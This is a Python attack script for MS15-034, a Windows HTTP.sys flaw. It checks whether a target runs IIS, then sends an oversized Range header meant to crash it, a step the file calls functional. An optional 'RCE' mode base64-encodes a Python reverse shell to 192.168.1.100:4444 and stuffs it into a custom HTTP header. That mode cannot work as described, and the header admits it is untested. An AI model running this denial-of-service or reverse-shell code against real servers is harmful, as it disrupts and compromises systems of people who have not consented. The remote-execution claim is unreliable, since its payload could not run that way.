#             ('-. .-.               .-')    .-') _     .-')      ('-.              
#            ( OO )  /              ( OO ). (  OO) )   ( OO ).  _(  OO)             
#  ,----.    ,--. ,--. .-'),-----. (_)---\_)/     '._ (_)---\_)(,------.   .-----.  
# '  .-./-') |  | |  |( OO'  .-.  '/    _ | |'--...__)/    _ |  |  .---'  '  .--./  
# |  |_( O- )|   .|  |/   |  | |  |\  :` `. '--.  .--'\  :` `.  |  |      |  |('-.  
# |  | .--, \|       |\_) |  |\|  | '..`''.)   |  |    '..`''.)(|  '--.  /_) |OO  ) 
#(|  | '. (_/|  .-.  |  \ |  | |  |.-._)   \   |  |   .-._)   \ |  .--'  ||  |`-'|  
# |  '--'  | |  | |  |   `'  '-'  '\       /   |  |   \       / |  `---.(_'  '--'\  
#  `------'  `--' `--'     `-----'  `-----'    `--'    `-----'  `------'   `-----'  
#POC OF DOS IS FUNCTIONAL AND WORKING AS INTENDED, WHILE RCE HAS NOT BEEN PROPERLY TESTED YET


import socket
import struct
import os
import argparse
import base64

class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

def banner():
    print(bcolors.OKGREEN + "\n[*] MS15-034 RCE Exploit - Remote Code Execution\n" + bcolors.ENDC)

parser = argparse.ArgumentParser(description='MS15-034 - Windows HTTP.sys Remote Code Execution')
parser.add_argument('-t', '--targethost', type=str, required=True, help='Target Host')
parser.add_argument('-p', '--port', type=int, required=True, help='Target Port')
parser.add_argument('--exploit', action='store_true', help='Execute RCE instead of DoS')
args = parser.parse_args()

ipAddr = args.targethost
port = args.port
hexAllFfff = b'18446744073709551615'
req1 = b'GET / HTTP/1.0\r\n\r\n'
req_dos = b'GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-' + hexAllFfff + b'\r\n\r\n'

def create_reverse_shell():
    payload = (
        "import socket,os,pty;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect(('192.168.1.100',4444));"
        "os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);"
        "pty.spawn('/bin/bash');"
    )
    return base64.b64encode(payload.encode()).decode()

def test_vulnerability():
    print('[*] Checking if target is running IIS...')
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ipAddr, port))
        client_socket.send(req1)
        r = client_socket.recv(1024)
        if b'Microsoft' not in r:
            print('[*] Target is NOT running IIS. Exiting...')
            return False
        print('[+] Target is running IIS.')
    except:
        print('[!] Could not connect to target.')
        return False
    finally:
        client_socket.close()
    return True

def trigger_dos():
    print('[*] Triggering DoS exploit...')
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ipAddr, port))
        client_socket.send(req_dos)
        r = client_socket.recv(1024)
        if b'Requested Range Not Satisfiable' in r:
            print('[!!] Target is VULNERABLE to MS15-034 (DoS)')
        elif b' The request has an invalid header name' in r:
            print('[*] Target is NOT vulnerable.')
        else:
            print('[*] Unknown response, target may still be vulnerable.')
    except:
        print('[!] Connection error.')
    finally:
        client_socket.close()

def trigger_rce():
    print('[*] Triggering Remote Code Execution...')
    reverse_shell_payload = create_reverse_shell()
    
    payload = b'GET / HTTP/1.1\r\n'
    payload += b'Host: vulnerable\r\n'
    payload += b'Range: bytes=0-' + hexAllFfff + b'\r\n'
    payload += b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n'
    payload += b'X-Remote-Code: ' + reverse_shell_payload.encode() + b'\r\n\r\n'

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ipAddr, port))
        client_socket.send(payload)
        print('[!!] Payload Sent - Reverse shell should be active.')
    except:
        print('[!] Could not send payload.')
    finally:
        client_socket.close()

if __name__ == "__main__":
    banner()
    
    if not test_vulnerability():
        exit(0)
    
    if args.exploit:
        trigger_rce()
    else:
        trigger_dos()
